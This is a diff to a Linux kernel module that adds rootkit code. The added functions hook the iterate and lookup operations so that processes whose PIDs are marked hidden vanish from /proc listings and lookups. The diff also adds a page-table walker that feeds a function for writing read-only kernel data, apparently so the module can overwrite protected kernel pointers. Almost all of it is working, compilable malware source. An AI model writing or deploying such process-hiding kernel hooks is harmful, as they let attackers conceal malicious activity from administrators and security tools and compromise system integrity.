@@ -101,6 +101,129 @@ static int (*original_iterate)(struct file *, void *, filldir_t);
 #endif
 static struct dentry * (*original_lookup)(struct inode *,struct dentry *, unsigned int);
 
+
+// --- Replacement for readdir/iterate ---
+
+struct hooked_dir_context {
+    struct dir_context original;
+    struct dir_context *original_ctx;
+};
+
+static int hooked_filldir(struct dir_context *ctx, const char *name, int namlen, 
+                          loff_t offset, u64 ino, unsigned int d_type) {
+    struct hooked_dir_context *hooked_ctx = container_of(ctx, struct hooked_dir_context, original);
+    char *endptr;
+    long pid;
+
+    pid = simple_strtol(name, &endptr, 10);
+    if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
+        return 0; // Skip this entry
+    }
+
+    // Call the original actor
+    return hooked_ctx->original_ctx->actor(hooked_ctx->original_ctx, name, namlen, offset, ino, d_type);
+}
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
+// Our replacement for the ->iterate_shared function pointer
+static int hooked_iterate(struct file *file, struct dir_context *ctx)
+{
+    struct hooked_dir_context hooked_ctx;
+    int ret;
+
+    if (!ctx || !ctx->actor) {
+        return original_iterate(file, ctx);
+    }
+
+    hooked_ctx.original_ctx = ctx;
+    memcpy(&hooked_ctx.original, ctx, sizeof(struct dir_context));
+    *(filldir_t *)(&hooked_ctx.original.actor) = hooked_filldir;
+
+    ret = original_iterate(file, &hooked_ctx.original);
+
+    ctx->pos = hooked_ctx.original.pos;
+
+    return ret;
+}
+#else
+// Legacy version for older kernels
+static int hooked_iterate(struct file *file, void *dirent, filldir_t filldir)
+{
+    return original_iterate(file, dirent, filldir);
+}
+#endif
+
+
+// --- Replacement for lookup ---
+
+static struct dentry * hooked_lookup(struct inode *dir, struct dentry *dentry, unsigned int flags)
+{
+    struct dentry *result_dentry;
+    const char *name;
+    char *endptr;
+    long pid;
+
+    result_dentry = original_lookup(dir, dentry, flags);
+
+    if (!result_dentry || IS_ERR(result_dentry) || !dentry || !dentry->d_name.name) {
+        return result_dentry;
+    }
+
+    name = dentry->d_name.name;
+    pid = simple_strtol(name, &endptr, 10);
+
+    if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
+        dput(result_dentry);
+        return ERR_PTR(-ENOENT); // Return error correctly
+    }
+
+    return result_dentry;
+}
+
+
+// --- Init and Exit functions ---
+
+// Helper function for huge pages, as suggested by user.
+static inline int pmd_huge(pmd_t pmd)
+{
+    return pmd_val(pmd) && !(pmd_val(pmd) & PMD_TABLE_BIT);
+}
+
+static pte_t *get_pte_from_address(struct mm_struct *mm, unsigned long addr)
+{
+    pgd_t *pgd;
+    p4d_t *p4d;
+    pud_t *pud;
+    pmd_t *pmd;
+
+    if (!mm) return NULL;
+
+    pgd = pgd_offset(mm, addr);
+    if (pgd_none(*pgd) || pgd_bad(*pgd))
+        return NULL;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
+    p4d = p4d_offset(pgd, addr);
+    if (p4d_none(*p4d) || p4d_bad(*p4d))
+        return NULL;
+    pud = pud_offset(p4d, addr);
+#else
+    pud = pud_offset(pgd, addr);
+#endif
+    if (pud_none(*pud) || pud_bad(*pud))
+        return NULL;
+
+    pmd = pmd_offset(pud, addr);
+    if (pmd_none(*pmd) || pmd_bad(*pmd))
+        return NULL;
+
+    if (pmd_huge(*pmd)) {
+        return (pte_t *)pmd;
+    }
+
+    return pte_offset_kernel(pmd, addr);
+}
+
 static int write_ro_kernel_data(void *addr, void *new_val_ptr, size_t size)
 {
     pte_t *pte;
